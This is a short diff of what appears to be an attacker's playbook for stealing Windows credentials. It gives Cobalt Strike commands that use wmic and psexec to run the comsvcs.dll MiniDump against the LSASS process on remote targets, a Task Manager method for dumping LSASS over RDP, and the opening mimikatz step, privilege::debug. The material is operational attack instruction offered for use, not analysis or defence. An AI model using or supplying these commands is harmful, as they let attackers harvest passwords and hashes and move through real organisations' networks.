@@ -8,11 +8,15 @@ method via cobalt: (*** special thanks to @dtob1804 )
 (remove on remote car) coba_wmic:
 shell wmic /node:[target] process call create "cmd /c rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump PID C:\ProgramData\lsass.dmp full"
 remote-exec psexec [target] cmd /c rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump PID C:\ProgramData\lsass.dmp full
+
 =======
+
 method via RDP:
 open taskmgr => PKM po lsass process => create Dump file.  \\ Next, download the file to your computer,
 
+
 =======
+
 how to dump it:
 open mimic and then:
 privilege::debug
